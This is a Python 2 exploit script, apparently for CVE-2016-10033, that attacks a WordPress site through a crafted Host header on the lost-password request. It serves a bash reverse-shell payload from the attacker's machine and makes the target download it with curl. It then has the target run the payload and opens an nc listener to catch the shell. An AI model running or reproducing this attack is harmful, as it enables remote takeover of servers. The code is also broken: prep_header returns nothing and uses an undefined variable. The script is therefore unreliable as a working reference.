#!/usr/bin/env python 
import SocketServer, SimpleHTTPServer, threading
import subprocess, os, sys, time, shutil
import requests 

#print usage if improper # of args
if len(sys.argv) == 1 or len(sys.argv) > 4:
    print 'usage:   ./CVE-2016-10033.py <target site> <your ip:port> <username>'
    print 'example: ./CVE-2016-10033.py http://site.com/ 1.2.3.4:4444 admin'
    quit()

#set vars
host_header=''
url = sys.argv[1]
host, port = sys.argv[2].split(':')
username = sys.argv[3]

#make temp directory for payload
cwd = os.getcwd()
if not os.path.exists(cwd+'/tmp'):
	os.makedirs(cwd+'/tmp')
os.chdir(cwd+'/tmp')

#method for converting special characters
def prep_header(cmd): 
    cmd='\${run{'+cmd+'}}'
    cmd = cmd.replace('/', '${substr{0}{1}{$spool_directory}}') #convert /
    cmd = cmd.replace(' ', '${substr{10}{1}{$tod_log}}') #convert ' '

    host_header='target(any -froot@localhost -be '+rce_cmd+' null)'

#create payload
print '[+] Generating Payload'
rev_cmd = '(sleep 10s && nohup bash -i >/dev/tcp/'+host+'/'+port+' 0<&1 2>&1) &'
with open('rce.txt', 'w') as inf:
        inf.write(rev_cmd)

#serve the payload; threading is meant for easy shutdown at end
print '[+] Hosting payload on simple server'
httpd = SocketServer.TCPServer((host, 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
thread = threading.Thread(target = httpd.serve_forever)
thread.daemon = True
thread.start()

#write payload to host
print '[+] Downloading payload to remote host'
run_cmd = '/usr/bin/curl -o/tmp/rce '+host+'/rce.txt'
prep_header(run_cmd)
headers = {'Host':host_header,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'}
r = requests.post(url+'wp-login.php?action=lostpassword',              #lost password URL
    headers=headers, allow_redirects=True, verify=False,               #standard request info
    data={'user_login':username, 'wp-submit':'Get+New+Password'})      #POST info

#wait two minutes for slower connections/delays/etc
time.sleep(60)

#kill server
print '[+] Shutting down server'
httpd.shutdown()
shutil.rmtree(cwd+'/tmp')

#execute payload stored on host
print '[+] Executing payload on remote host'
cmd = '/bin/bash /tmp/rce'
prep_header(cmd)
r = requests.post(url+'wp-login.php?action=lostpassword',              #lost password URL
    headers=headers, allow_redirects=True, verify=False,               #standard request info
    data={'user_login':username, 'wp-submit':'Get+New+Password'})      #POST info

#start reverse listener with nc
print '[+] Starting reverse listener'
subprocess.call(["sudo","nc","-lvp "+port])
